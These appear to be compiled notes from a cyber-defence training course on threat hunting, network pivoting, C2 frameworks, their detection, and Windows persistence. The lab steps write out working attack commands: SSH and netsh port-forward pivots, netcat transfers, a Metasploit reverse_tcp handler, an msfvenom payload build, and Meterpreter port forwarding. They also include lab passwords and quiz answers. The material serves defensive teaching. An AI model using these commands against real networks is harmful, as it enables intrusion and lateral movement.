This bucket adds the process name utilized in the communications from the hosts reporting to Elastic Stack to the data table.

14. Navigate to page 2 of the Data Table, as shown in Figure 8.1-16. Notice the two entries for the use of nc.exe on port 4444, the executable for Netcat. Netcat was used to create bind and reverse shells in this lesson. 

5. Select the three-line menu on the left, within the menu, under Analytics, select Visualize Library.


6. Within Visualize Library, select Create Visualization.


7. Within New visualization, select Aggregation Based > Data Table.


8. Within New Data table/Choose a source, select *:so-*. The table looks like Figure 8.1-13:

NOTE: The count is different from the screenshot due to Kibana's defaulting to a timeframe of Last 24 hours. 


9. Set the time and date range to: Nov 1, 2021 @ 00:00:00.000 -> Nov 8, 2021 @ 23:30:00.000.


10. Under Buckets, select Add. Add a bucket with the following selections:
Split rows
Aggregation: Terms
Field: agent.hostname.keyword
Metric: Count
Order: Descending 
Size: 100

This bucket adds the hostnames of host reporting to Elastic Stack to the data table.


11. Under Buckets, select Add. Add a bucket with the following selections:
Split rows
Aggregation: Terms
Field: destination.port
Metric: Count
Order: Descending 
Size: 100

This bucket adds the destination ports of all communications from the hosts reporting to Elastic Stack to the data table.


12. Under Buckets, select Add. Add a bucket with the following selections:
Split rows
Aggregation: Terms
Field: destination.ip
Metric: Count
Order: Descending 
Size: 100

This bucket adds the destination IP addresses of all communications from the hosts reporting to Elastic Stack to the data table.


This can help visualize the logs that contain vital communication information. During a hunt or investigation, this can be used to quickly analyze destination IP addresses and ports to identify potentially suspicious activity. IP addresses and ports that populate with significantly less frequency should be reviewed immediately to determine if the activity is expected.  


The type of process used by hosts can help to identify suspicious activity. An unexpected or mysterious process can be quickly identified by the communications collected by the SIEM.


13. Under Buckets, select Add. Add a bucket with the following selections:
Split rows
Aggregation: Terms
Field: process.name.keyword
Metric: Count
Order: Descending 
Size: 100

This bucket adds the process name utilized in the communications from the hosts reporting to Elastic Stack to the data table.

14. Navigate to page 2 of the Data Table, as shown in Figure 8.1-16. Notice the two entries for the use of nc.exe on port 4444, the executable for Netcat. Netcat was used to create bind and reverse shells in this lesson. 

The IP address 128.0.7.206 appears only once in the table. The IP address is not similar to any of the other addresses listed on the table and is using an executable that is a known tool that can be leveraged by adversaries. 

Pivoting Overview
Pivoting refers to the concept of an attacker moving from one compromised system, or “foothold,” to another system with the intent of gaining greater access to network resources. Pivoting occurs when the attacker gains access from outside the network and moves within it. Similarly, lateral movement occurs when the attacker gains access from inside the network and moves within it. Pivoting allows attackers to navigate around certain security and detection entities, such as firewalls, to conduct further operations from within the network itself. Pivoting facilitates operations such as the following:

Reconnaissance

Exploitation of hosts and servers

Passive collection

Attackers also employ pivoting outside of the targeted network, when attempting to redirect, or obfuscate, their origins. This pivoting type targets networks that are loosely connected to the targeted network to take advantage of trust relationships between business partners or industries. Defenders must understand the methods, tools, and techniques that attackers use to create footholds and pivot within a network to begin behavior detection and mitigation.

﻿

Why Pivot
﻿

When an attacker gains access to a server or host on the network, they have two primary options to continue their efforts. First, they can survey the compromised device in order to identify assets of interest and opportunities for destructive actions. Possible assets and opportunities include the following:

Ransomware

Collection and exfiltration of proprietary data

Theft of resources

Cryptocurrency mining

Second, the attacker may pivot to other devices or networks. As part of the initial survey of a compromised system, attackers identify adjacent networks or hosts that were previously inaccessible. If the compromised system is in a new network or segment, this allows attackers to conduct reconnaissance from a computer in a remote network. Ideally, the remote network has limited interference from peripheral devices, such as firewalls and routers. This method creates less noise on the network. Creating multiple chains of proxies or pivots makes attributing the actions of the attacker challenging. 

﻿

Common Pivoting Methods
﻿

Pivoting techniques commonly use the SSH protocol since it is typically a known “good” protocol for system administration and is also encrypted. SSH is a secure connection that allows remote administration of hosts and servers through a CLI. By default, SSH servers accept incoming connections on the Transmission Control Protocol (TCP) port 22. The SSH protocol was created as a secure version of Telnet, but with encryption as a priority. SSH has the ability to encapsulate and tunnel other types of traffic through an established connection. When network traffic is sent through the SSH tunnel, it is forwarded to its final destination from that SSH server. Attackers take advantage of this SSH feature and use it as one of the primary communication methods for pivoting. SSH servers are common on the following:

Servers

Network devices

Internet of Things (IoT) devices

The examples described below demonstrate the steps attackers take to create simple SSH pivots within a network.

 

Pivoting Types
﻿

Adversaries have three main options, when selecting the optimal port forwarding pivots. The types of port forwarding pivots include the following:

Local

Remote

Dynamic

The characteristics, features, and use cases of each pivoting type are covered below.  

﻿

Local Port Forwarding
 

Local port forwarding connects a user from the local computer to another server. This is done by the SSH client listening for traffic on a specified local port and when receiving data. In the scenario described below,  SSH tunnel traffic appears to originate from a foothold within the target network, before moving to the remote network device. This scenario is illustrated in Figure 3.2-1.

 

Scenario

 

An attacker wants to access a File Transfer Protocol (FTP) server on port 21 and conduct reconnaissance behind a network firewall. The firewall blocks all FTP traffic and reconnaissance attempts. The attacker compromises a box on the internal network named Foothold1 with Internet Protocol (IP) address 192.168.1.1. The firewall allows web traffic on port 80 to flow freely, as there are several web servers on the network. Since the attacker already has access to Foothold1, one way to bypass the firewall rules is to start an SSH server on port 80.

 

To circumvent the firewall rules, the attacker configures a local port forward connection on Foothold1. The configuration redirects all traffic from local port 6000, on the system which originates the SSH connection, to remote port 21. The configuration then sends the traffic to the FTP server within the target network. The attacker then has the ability to freely access files in the FTP server from their host. All traffic is encapsulated by SSH and unpacked at Foothold1. Once unpacked, the Foothold1 box redirects the traffic to the configured FTP server and sends all corresponding response traffic through the same tunnel to the attacker’s host. 

﻿

﻿

Figure 8.2-1

 

Remote Port Forwarding
 

Remote port forwarding differs from local port forwarding in that the configured SSH redirect forwards the traffic from the remote SSH server to a specified host. The specified host is often the local system that is running the SSH client. An example is when the attacker has a resource locally that they want to make available on the remote network. The resource includes the following:

Internal phishing server

Tool repository

Command and Control (C2) server

Other exploitation-related resources

Scenario

 

While conducting reconnaissance on the internal network depicted in Figure 8.2-2, the attacker learns that the compromised host Foothold1 is multihomed. Multihoming is the practice of connecting a host to more than one network. Foothold1 is connected to the production network where a MySQL server resides. The attacker gains access to the server and needs additional tools in order to gain elevated privileges. Due to network restrictions, the MySQL server only accesses the network labeled Target Network over port 8080. 

﻿

﻿

Figure 8.2-2

 

The code blocks below detail one way an attacker uses tunnels to gain access to remote systems. This example also allows remote systems to have access to resources hosted on the attacker's system.

﻿

The first code block, below, creates a tunnel from the attacker's system through Foothold1 to an SSH server on 192.168.2.2 listening on port 22. It also creates a remote tunnel on Foothold1 listening for incoming connection to port 8080 that forwards traffic to the attacker's system on their local port 80.

 

attacker$ ssh -L 6000:192.168.2.2:22 -R 8080:127.0.0.1:80 -p 80 user@192.168.1.1
foothold1$
 

The second code block waits for connections to port 80 on the attacker's system. After a connection is made, it sends the file privesc.sh to the remote system. This block is written as follows:

 

attacker$ nc -l -p 80 < privesc.sh
 

The third code block, below, uses the local tunnel on port 6000 to connect to the SSH server on MySQL on 192.168.2.2. After making this connection, the attacker makes another connection to the remote tunnel on 192.168.1.1 over port 8080. This connection to the remote tunnel uses the reverse tunnel on port 192.168.1.1 and redirects the traffic to port 80 on the attacker's system. The attacker’s system is where the file privesc.sh is then sent to the MySQL server and saved.

 

attacker$ ssh -p 6000 user@127.0.0.1
user@mysqlserver$ nc 192.168.1.1 8080 > privesc.sh
﻿

Dynamic Port Forwarding
 

Once attackers compromise a server in the production environment, the next step is to set up dynamic port forwarding. Dynamic port forwarding allows the attacker to create a communication connection point or socket on the MySQL server. This socket is a proxy for the attacker acting as an intermediary for their malicious behavior. The first step for creating the dynamic port forwarding is to create a remote port forward much like the one the attacker just created. The following commands make the initial connections to Foothold1 and mysqlserver.

﻿

attacker$ ssh -L 6000:192.168.2.2:22 -p 80 user@192.168.1.1
foothold1$
attacker$ ssh -D 127.0.0.1:9050 -p 6000 user@127.0.0.1
user@mysqlserver$
﻿

The option -D creates a dynamic port forwarding that originates from the attacker's local port 9050 through the tunnel to the MySQL server. Traffic sent through the attacker's port 9050 appears to originate from mysqlserver.

 

With the dynamic port forward established, the attacker uses the MySQL server at IP address 192.168.2.2 as a proxy gateway to scan the production network. This is done by using the utility ProxyChains, which provides functionality to forward network traffic through a proxy from tools like Nmap. The following is the command to scan the production network:

 

attacker# proxychains nmap -sn 192.168.2.2/24
 

This tunnel sequence, as illustrated in Figure 8.2-3, is an example of how an attacker obfuscates their path through a network and makes it much harder for defenders to identify compromised hosts.

﻿Tools for Pivoting
Attackers have a wide selection of tools to aid in pivoting. Each tool carries specific features based on the architecture of the target network. This section introduces the following tools that attackers use for pivoting:

Metasploit

Netsh

Netcat

Socat

Ngrok

Metasploit
 

The Metasploit framework contains easy-to-use tools, such as Meterpreter, that pivot inside a network and set up footholds where attackers have compromised network resources. According to Metasploit: 

﻿

“Meterpreter is an advanced, dynamically extensible payload that uses in-memory Dynamic Link Library (DLL) injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby Application Programming Interface (API).”

﻿

Figure 8.2-4 displays a host that was exploited on the network 192.168.0.0/24 using a reverse TCP shell payload.  

﻿

﻿

Figure 8.2-4

 

Within the Meterpreter session, the command ipconfig runs to show that the exploited host is multihomed. The host is connected to both networks 172.16.0.0/24 and 192.168.0.0/24. In this scenario, the attacker does not have access to the 172.16.0.0/24 network from external resources and wants to conduct operations on it, as shown in Figure 8.2-5:

﻿

﻿

Figure 8.2-5

 

The attacker creates a port forward from the exploited host so that their traffic is routed through the compromised host and sent to the newly discovered network. This is done using the command autoroute, a post-exploitation feature of Meterpreter that creates a pivot through an existing Meterpreter session. Figure 8.2-6 is the syntax for the command autoroute to be configured for the network 172.16.0.0/24. 

﻿

﻿

Figure 8.2-6

 

After creating a pivot on the host 192.168.0.3, the attacker conducts further operations within that network that they were unable to reach before.

 

Netsh
 

Netsh refers to a Windows CLI for configuring network devices. A netsh configuration option has the capability of setting up a port-based proxy between network devices, referred to as a portproxy. A portproxy is a communication channel that listens for incoming network traffic and forwards it to a remote host from a specified port on the host's network interfaces. Portproxy also enables a system to redirect all traffic originally intended for that port to a different port. A pivot technique such as portproxy enables attackers to access hosts that are not directly accessible through the system attacker compromised. 

 

Netcat
 

Netcat is a networking utility that is used to establish and communicate TCP or User Datagram Protocol (UDP) network connections. The adversary uses netcat to create footholds on remotely accessible networks. With netcat, the adversary easily pivots from one compromised machine to another to gain information such as the following: 

IP addresses

Open ports

Available hosts

Additionally, the use of netcat allows the adversary to run scans for found services and web applications.

 

Socat
 

Socat is a networking utility that is for bi-directional communication between two hosts that uses data channels. Socat is sometimes referred to as an “advanced netcat” due to the wider variety of connections it manages. Socat handles relevant data channels that include the following:

Files

Pipes

Devices (serial line, pseudo-terminal, etc.)

Sockets (UNIX, IP4, IP6 - raw, UDP, TCP)

Secure Sockets Layer (SSL) sockets

Proxy CONNECT connections

File descriptors (stdin, etc)

The GNU line editor (readline)

Programs

Combinations of two of these

Attackers often use Socat's capabilities in routine socket redirections to pivot. They may also use its less common features to create complex communication channels that are extremely stealthy and difficult to detect.

 

Ngrok
 

Ngrok is a developer tool designed to aid in testing connectivity and functionality for network-based applications. Ngrok allows local services to be accessible on the internet, even if the services sit behind Network Address Translation (NAT) or a firewall. The internet accessibility also means that it makes any port on a local computer accessible through a secure tunnel from the internet. Ngrok is easily leveraged by the adversary to reach services and ports that otherwise are not accessible.


\\


Which pivoting technique leverages portproxy to establish communications between devices?
ntsh

What is the relationship between pivoting and lateral movement?

Pivoting Using Netsh Portproxy
Walk through pivoting by setting up a portproxy between the attacker host and a host configured to use another network. This workflow uses three hosts to demonstrate pivoting using portproxy. The hosts and their IP addresses are:

Attacker host red-kali: 128.0.7.205

ch-tech-1 workstation: 172.35.13.2 and 10.10.13.2

ch-tech-3 workstation: 10.10.13.4

The attacker host has connectivity to the workstation ch-tech-1 on the network 172.35.13.0/24. Ch-tech-1 has connectivity from the network 128.0.7.0/24, through the internet, and to the network 10.10.13.0/24. The workstation ch-tech-3 only has connectivity to the network 10.10.0.0/16. This design does not enable the attacker host to directly connect to the workstation ch-tech-3. Pivoting using portproxy bridges the two networks and enables reconnaissance from the Attacker host and ch-tech-3 workstation.

2. Use an Administrator command prompt to run the following command:

C:\Windows\system32>ipconfig
﻿
The output confirms ch-tech-1 has a connection to the network 172.35.13.0/24 and the network 10.10.0.0/16. 

 

3. Create a portproxy listening on port 1337 by running the following command:

C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=1337 connectport=8000 connectaddress=10.10.13.4
﻿

With this command, data can be sent and received over port 1337 from the compromised host 10.10.13.4 on port 8000. 

 

4. To verify the portproxy is listening as expected, run the following command:

C:\Windows\system32>netsh interface portproxy show v4tov4
 

The command v4tov4 is a functionality of netsh that maps a port and IPv4 address to send messages received after establishing a separate TCP connection.

 

Figure 8.2-8 displays the returned output, which confirms the ch-tech-1 is listening on port 1337 and communicating to receive data from 10.10.13.4 on port 8000. 


An artifact of the portproxy method is the configuration information stored in the host's registry. To detect the existence or persistence of portproxy configurations, analyze the registry key as described in the next step. 

 

6. Detect persistent portproxy configurations by running the following cmdlet within the PowerShell window: 

PS C:\Windows\system32> Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp
﻿The command retrieves properties of a specified item on a defined path. In this instance, PowerShell iterates through the defined registry path for any occurrences of the service portproxy using v4tov4 over TCP. 

 

Figure 8.2-9 displays the returned output, which displays the existence of the portproxy in the registry, utilizing port 1337, communicating with the IP address 10.10.13.4 on port 8000. 

9. Create a simple Hypertext Transfer Protocol (HTTP) web server using the exploited machine ch-tech-3 as a host by entering the following command in PowerShell:

PS C:\Users\trainee> python -m http.server 8000
 

According to the output, the server is located at http://0.0.0.0:8000/. 

11. Open Terminal and enter the following commands to retrieve the file test.txt by using the portproxy pivot:

(trainee@red-kali)-[~] $ wget http://172.35.13.2:1337/Desktop/test.txt
(trainee@red-kali)-[~] $ cat test.txt
﻿

Figure 8.2-10 displays the returned output, which shows that the file was retrieved. 

The commands from the last step connected to the workstation ch-tech-1 at 10.10.13.2, on port 1337. The workstation ch-tech-1 forwards the communication to ch-tech-3 on port 8000 to access and return the file requested. This is a simple example of how pivoting works i n a network. A simple portproxy is set up on an initially compr omised host ch-tech-1 to listen for data from another compromised host ch-tech-3. The workstation ch-tech-3 did not have connectivity to the attacker host red-kali. However, with netsh and portproxy, pivoting was able to deliver the file test.txt from the workstation ch-tech-3 to the host red-kali. 

Within Terminal, run the following Nmap scan:
(trainee@red-kali)-[~] $ sudo nmap -sn 172.35.13.0/24
[sudo] password for trainee: CyberTraining1!



NOTE: The scan takes 1–2 minutes to complete. 


Figure 8.2-11 displays the scan results. The ping-only scan returns three hosts, providing little information about the network. 

Scanning for hosts in a network from an external position is normally not possible. These scans may not always return useful data due to firewall rules. Access the network through a simulated exploit and conduct a scan after accessing a machine used to pivot. 


4. From the desktop, select Applications.


5. Use the Search bar to search for and select Metasploit framework. 


NOTE: If prompted, enter the password CyberTraining1! for the user trainee.


6. Within the Metasploit session, enter the following series of commands:
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(handler) > set LHOST 128.0.7.205
msf6 exploit(handler) > set LPORT 4444
msf6 exploit(handler) > set ExitOnSession false
msf6 exploit(handler) > exploit -j



Figure 8.2-12 displays the Metasploit session after running the previous commands:

These commands open a listener on the attacker VM with IP address 128.0.7.205 on port 4444, to “catch” a reverse shell callback from a remote payload. 


8. Open the folder Executable on the desktop.


The folder Executable contains a malicious executable (.exe) file titled test.exe. 


9. Run test.exe to establish a reverse TCP shell between the target ch-tech-1 and the attacker host red-kali.


The executable, test.exe, is a malicious payload that simulates a user-executed exploit. This type of payload is created using msfvenom with the following command: 
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=128.0.7.205 LPORT=4444 --platform win -a x86 -f exe -o test.exe -e x86/ -i8

10. Return to the red-kali VM and access the already established Metasploit session. 


Figure 8.2-13 displays the output after opening the payload test.exe. Meterpreter session 1 opens between the attacker host at IP 128.0.7.205:4444 and the target host at IP 172.35.13.2. 

Opening the Meterpreter session 1 allows it to be used for accessing and running commands on the target host. 


11. Within the Metasploit session, enter the following command:
msf6 exploit(multi/handler) > sessions



The output, as displayed in Figure 8.2-14, defines the Operating System (OS), account information, IP addresses, and ports. 

12. Enter the following command to open a Meterpreter session with the target host:
msf6 exploit(multi/handler) > sessions -i <session number>

NOTE: A session number different than the screenshot in step 10 may be displayed during this workflow. 


Meterpreter is an attack payload that provides an interactive shell for remotely analyzing and exploring the target machine. After establishing a Meterpreter session, the remainder of the lab focuses on how attackers use Meterpreter to pivot within the exploited network. 


13. Within the Meterpreter session, run the following command to display information about the exploited machine:
meterpreter > ipconfig



Figure 8.2-15 displays that the target machine has the following three interfaces:
Interface 1: 127.0.0.1
Interface 2: 10.10.13.2
Interface 3: 172.35.13.2

14. Perform an Address Resolution Protocol (ARP) scan for the given IP range in the Meterpreter session by running the following command with the arp_scanner function:
meterpreter > run arp_scanner -r 10.10.13.0/24



ARP presents a table of the documentation and organization of each host's Media Access Control (MAC) address and corresponding IP address. The arp_scanner function within Meterpreter network scanning takes time and leaves the VM red-kali open for 5–10 minutes to display a portion of the results returned from the scan. 


Figure 8.2-16 shows the results from the scan:

15. Create a port forward to 10.10.13.4 on the Windows Remote Desktop Protocol (RDP) port 3389:
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.13.4



The command includes the following elements to establish port forwarding on the pivot host:
add adds the port forwarding to the list.
-l 3389 is the local port that listens and forwards to the target.
-p 3389 is the destination port on the target host.
-r 10.10.13.4 is the targeted system’s IP address or hostname.

NOTE: For the next step, keep Metasploit and Meterpreter active.


16. Use the original terminal or a new terminal to enter the following command:
(trainee@red-kali)-[~] $ netstat -antp



The results, as displayed in Figure 8.2-17, indicate that 0.0.0.0 is listening on port 3389 in addition to the pivot host on port 4444.

17. In a terminal window separate from Meterpreter, enter the following command to connect to the Windows host 10.10.13.4 over RDP and enter YES at the certificate prompt:
(trainee@red-kali)-[~] $ rdesktop -d vcch -u trainee -p "CyberTraining1!" 127.0.0.1:3389

This sequence of port forwards allows the attacker to gain access to the remote host over a forwarded RDP connection.

Network Segmentation as a Pivoting Mitigation
The design and architecture of a network can mitigate exploitation through pivoting. Below are devices and designs that aim to separate a network's components, with the goal of providing greater security. 

﻿

Layer 2 Devices
﻿

The bridge is a fundamental Layer 2 device in ethernet networks that facilitates communication between multiple devices. Bridges provide basic network segmentation by examining the destination MAC address of each incoming frame and selectively forwarding it to the appropriate port. While bridges are still found in some networks where their specific features are advantageous, their usage is limited due to the issues they present, including the following:﻿

In complex network environments, bridges can introduce additional latency and overhead.

Bridges have limited capabilities compared to switches in terms of creating distinct and granular network segments.

Bridges lack advanced security features found in modern switches making them more vulnerable to exploitation.

Similar to bridges, switches facilitate connectivity between devices. However, unlike bridges, switches use logic to determine which ports to forward frames onto. Switching logic and MAC address tables are covered later in this lesson.

﻿

Basic switches exist that perform only the bare minimum of switching to ensure that collisions do not occur frequently and ensure basic addressing. These switches, sometimes referred to as unmanaged switches, are found in small business and home networks and even used in some enterprise networks. However, managed switches are typically used in enterprise networks, especially for central connectivity within the network. System administrators configure and support more features for these switches, such as the ability to mirror ports or create VLANs to segregate networks. 

﻿

LAN Overview
﻿

A LAN is comprised of devices communicating in a defined or limited area, such as an office, house, or business. LANs generally are small in size and consist of a minimum number of devices. Common devices found in a LAN are bridges, routers, and switches. In a LAN, packets are advertised to each device, meaning every device in the network receives packets being transported within the network. A LAN design means resources are allocated exclusively to that LAN, so they can have high delivery speeds. However, the devices only operate for that LAN. A LAN is at a much higher risk for compromising. This is because there are very few devices or checks left in the way of hosts, once the adversary accesses the network.

﻿

VLAN Overview
﻿

A VLAN comprises devices connected by bridges and switches that are designed to communicate together as one single local area network (LAN), even though they operate separately. A VLAN's design enables network segmentation, meaning a bridge or switch is used to connect and open communication paths for devices found in different network areas. In a VLAN, packets are sent to a specific, unique, broadcast domain, so the packet is only communicated to the intended devices. From a security perspective, hosts located on separate VLANs are compartmentalized, requiring adversaries to access multiple devices to reach each host. From an infrastructure perspective, VLANs improve the utilization of resources. These resources do not need to be exclusively dedicated to a single LAN. 

﻿

Network Segmentation
﻿

Network segmentation is the primary mitigation strategy for pivoting. When an adversary compromises a host on the network, the next steps include scanning or attempting to see other devices, information, or hosts in range. By segmenting a network, the location or segment of these devices, information, or hosts are in different locations on the network. This means they are not easily visible or accessible to the adversary. Without network segmentation implemented, an adversary that gains access to the network easily pivots between devices or hosts searching for sensitive data. 

Demilitarized Zone (DMZ)

A DMZ is a perimeter sub-network (or “subnet”), located between private networks and the public internet. A DMZ's primary goal is regulation of traffic in between the private network and the internet. The DMZ ensures that only expected or allowed traffic is flowing in and out of the private network, keeping the LAN secure. Common servers or resources found in a DMZ include: 

Domain Name System (DNS)

FTP

mail servers

web servers

A key design element of the DMZ is the location of the servers or resources in an area where they access the internet but have a limited, minimal level of LAN. Using a DMZ helps mitigate pivoting because of its segmented nature. A DMZ is positioned away from the LAN and has minimal communications. Additionally, a firewall typically sits between the DMZ and the LAN. If the DMZ gets compromised, the firewall keeps the LAN secure.

Which segmentation techniques make pivoting difficult?
VLAN, DMZ

Pivoting Detection Methods
Pivoting is one of the most challenging activities to detect. A key component of pivoting is command propagation, where attackers tunnel through two or more hosts in order to reach their final target. Defenders cannot detect command propagation through signatures, data, or artifacts created as a result of the activity. There is a large amount of research into the creation of algorithms to better detect pivoting and alleviate the resources required to detect pivoting. Network traffic is the basis for detection algorithms that review the traffic and assign a score based on the perceived threat level. Outside of the research into algorithms, pivoting detection includes analysis of traffic paths and reconnaissance activities. The following are basic pivoting detection strategies:

Path novelty

Reconnaissance activities

Hunt artifacts

Path Novelty 
﻿

Path novelty is one component that can be detected when pivoting occurs. Path novelty is the creation of new paths or communications. Traffic paths created between hosts that may have not previously occurred may be a signal that the attacker has pivoted to a new host. The traffic paths include network activity, data transfers, and requests. This detection method applies to hosts that communicate infrequently. When hosts see an unexpected uptick in traffic, this activity must be investigated. 

﻿

Reconnaissance Activities
﻿

Observing reconnaissance activities coming from within the network may provide data points that, when analyzed, indicate pivoting has occurred. 

﻿

MITRE ATT&CK® describes reconnaissance as follows:

“Reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting.”

﻿

Activities connected to reconnaissance include: 

Scanning active networks.

Gathering host information, such as IP addresses, names, and email addresses.

Connecting to new or uncommon ports.

Hunt Artifacts
﻿

Artifacts in a hunt include Sysmon events and Windows Event Identifiers (ID). Table 8.2-1 lists the IDs to consider when approaching a hunt that may include pivoting:

﻿

winlog.event_data.TargetObject 
winlog.event_data.Details
winlog.event_id


The field winlog.event_data.TargetObject is useful for querying based on registry change. Collected by Winlog Beat, winlog.event_data.TargetObject allows for querying of accessed or manipulated objec

Which event IDs are associated with the port proxy activity? 
12 13

Popular C2 Frameworks
Command and Control (C2) is the set of tools and functionality used by the adversary, aimed at continuing communication from an exploited and accessed host or machine. C2 most commonly includes communication paths and methods connecting the victim host to the adversary's system. The communication paths are designed to be covert and to mimic expected network traffic in an effort to avoid detection from the victim's network. Within the communication pipeline flows valuable data, stolen from the victim machine. 

﻿

C2 Techniques 
﻿

As of late 2021, MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) lists 16 C2 techniques in recent cyber campaigns. The C2 techniques contain a variety of sub-techniques and may be leveraged by open-source frameworks.

What is the primary goal of C2 open-source frameworks?

Popular C2 Frameworks
There are significant open-source resources, tools, and methods for C2. Most open-source C2 frameworks are located in the post-exploitation phase of the Cyber Kill Chain® and are focused on two primary goals: detection avoidance and establishing communications. A few of the most popular C2 exploitation frameworks are described below. This is not an exhaustive list, cybersecurity and the common techniques in use are in a constant state of evolution and change.

﻿

Merlin
Support of C2 protocols over Hypertext Transfer Protocol (HTTP) and Transport Layer Security (TLS).
Support on Windows, Linux, macOS Operation Systems (OS). If it works on Go, it works with Merlin.
Enables Domain Fronting, a technique used to exploit routing schemes to obfuscate intended destination of HTTPS traffic. 
C2 traffic message padding - adding data to a message/communication to avoid detections based on message/communication size.
Empire
﻿

Empire is a post-exploitation framework that includes pure-PowerShell Windows agents, Python 3.x Linux/OS X agents, and C# agents. The framework offers cryptologically secure communications and flexible architecture. Empire includes the following features:

Ability to run PowerShell agents with the use of PowerShell.exe to avoid detection. 
Rapidly deployable post-exploitation modules that include key loggers and Mimikatz. 
SHAD0W
﻿

SHAD0W is a modular C2 framework designed to successfully operate on mature environments. It uses a range of methods to evade Endpoint Detection and Response (EDR) and Anti-Virus (AV) while allowing the operator to continue using tooling and tradecraft they are familiar with. SHAD0W includes the following features:

Docker compatible; runs inside of Docker allowing for cross-platform usage.
Modular design allows for users to create new modules to interact and task beacons.
HTTP C2 Communication - All traffic is encrypted and sent using HTTPS.
Beacons are generated using different tools or formats (such as Executable [.exe] and PowerShell).
Enables process injection. 
Build Your Own Botnet
﻿

Build Your Own Botnet (BYOB) is an open-source, post-exploitation, pre-built, C2 server framework for students, researchers, and developers. BYOB is a beginner-friendly tool designed to be intuitive for those learning about offensive cybersecurity. BYOB includes the following features:

C2 Server with an intuitive, user-friendly, User Interface (UI).
Custom payload generator for a variety of platforms.
Allows students and developers to implement their own code and add features without the requirement of writing an original C2 server. 

Detecting Popular C2 Frameworks
C2 frameworks often leave behind artifacts and other pieces of evidence of their use behind. It is a tricky task to properly identify the artifacts and the persistence of the adversary in the network. Below are a few current C2 detection methods:

﻿

Detection in Network Traffic
﻿

Detecting C2 frameworks in network traffic refers to the auditing, analysis, and observation of packet flows across the network. Packets are analyzed by metrics such as size, frequency of being sent/received, and source/destination. When a packet is too large or small, communicates on a consistent interval, or to a suspicious destination, an alert is triggered, requiring analysts to investigate further. A key component of this detection method is close communication and coordination with network analysts to identify suspicious network traffic. 

﻿

Real Intelligence Threat Analytics
﻿

Real Intelligence Threat Analytics (RITA) is an open-source, machine-learning, tool that enables C2 beacon detection in network traffic, through ingestion of Zeek logs. RITA features include:

Searching for signs of beaconing behavior in and out of network.
Searching for signs of Domain Name System (DNS) tunneling by DNS based covert channels.
Querying blacklists to search for suspicious domains and hosts.
Detection Using Process Auditing 
﻿

Detection is accomplished by auditing and analyzing processes utilized by hosts on the network. It is common for hosts that have been exploited to use uncommon processes or exploit insecure processes, such as rundll32.exe. Detection by process auditing requires using security tools (such as Elastic Stack) to monitor all processes being executed across the network. As mentioned, rundll32.exe is a common Dynamic Link Library (DLL) executable, responsible to execute control panel item files. A key characteristic in detection by process auditing includes awareness of processes that are leveraged by the adversary. These processes need to be included in detection rules.

﻿

Detection by API Monitoring
﻿

Detection is done by monitoring API functions and events. These tools and techniques leveraged by the adversary often spawn events within Windows Event Viewer or Sysmon. The spawned events are monitored to detect activity. The spawned events may include the following activities:

Sysmon Event ID 3: Network connection
The network connection event logs TCP/User Datagram Protocol (UDP) connections on the machine. Each connection is linked to a process through the ProcessId and ProcessGUID fields. The event also contains the source and destination host names, Internet Protocol (IP) addresses, port numbers, and IPv6 status.
Sysmon Event ID 10: ProcessAccess
Sysmon 10 is logged when a process opens another process. Often when a process opens another process it is followed by queries or modifications in the address space of the target process. Sysmon 10 enables the detection of tools or functionality that read memory of processes in an attempt to steal credentials. 
Windows Event ID 4656: A handle to an object was requested
According to Microsoft, "event 4656 indicates that specific access was requested for an object. The object could be a file system, kernel, or registry object, or a file system object on removable storage or a device. Event 4656 can indicate if an adversary is attempting to utilize or manipulate any of the listed objects in an effort to maintain persistence or create C2 communications." 

Communication Interval
The two filters in place to display data only from host ch-dev-3 to destination IP address 128.07.205 are shown below. 

Communications between host ch-dev-3 and 128.07.205 occurred on a 5-minute interval, establishing communications three times every 15 minutes. The visualization is a clear indication of a repeated connection between a potentially compromised host and an external location. The connections need to be investigated further to determine if the activity is malicious. 

Review Log Information
﻿

Review the information collected in the log files to answer the subsequent knowledge checks. 

What are the primary methods to detect C2 communications?
network analysis 
process audit
api monitoring

Review the data collected within the log file. The key information collected includes the data listed below:
event.module : sysmon 
The log file was collected using sysmon.

event.code : 3
The log file includes sysmon event ID 3. Sysmon event ID 3 is logged when a TCP/UDP connection is made. 

process.name : powershell.exe
The process.name field includes the name of the process that was used to create the event. 

related.user : james.lopez
The related.user name field includes the username that created the event. 

Aggregation: Terms
Field: agent.hostname.keyword
Metric: Count
Order: Descending 
Size: 100

Windows Persistence Overview
Persistence refers to the installation of an implant, backdoor, or access method which is able to restart or reinstall upon deactivation. The most common example of persistence is the ability of malicious code to survive and restart after a device reboots. Adversaries often configure persistence mechanisms on compromised devices in order to maintain a foothold in a network so they can return for future operations. If a compromised device is stable and rarely reboots, such as in the case of network devices — adversaries may opt out of configuring a persistence mechanism and leave only their malicious code running in memory. Malicious code that only exists in memory is much harder to detect by defenders, but also cannot survive a reboot. In order for adversaries to maintain persistence, artifacts must be saved on the system, which restarts the malicious code. Adversaries use many different persistence methods to keep their foothold in environments they breach. Understanding persistence and knowing the common methods can help defenders detect and prevent adversaries from keeping a foothold in their client environments.

﻿

The MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) tactic for persistence is TA0003. Below is a list of the techniques and sub-techniques this lesson covers:

T1547.001: Registry Run Keys/Startup Folder
T1037.001: Logon Script (Windows)
T1543.003: Windows Service
T1053.005: Scheduled Task

Registry Run Keys/Startup Folder
Registry Run Keys
﻿

The registry is one of the oldest persistence techniques used by adversaries. Due to the large and complex nature of the registry, it makes a great hiding place for adversary persistence.

﻿

In Figure 8.4-1, the following registry key is selected: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

﻿

This registry key contains a non-default value of type REG_SZ, which indicates the data is an unstructured string. The highlighted process, VMware User Process, contains the data: "C:|Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr.

﻿

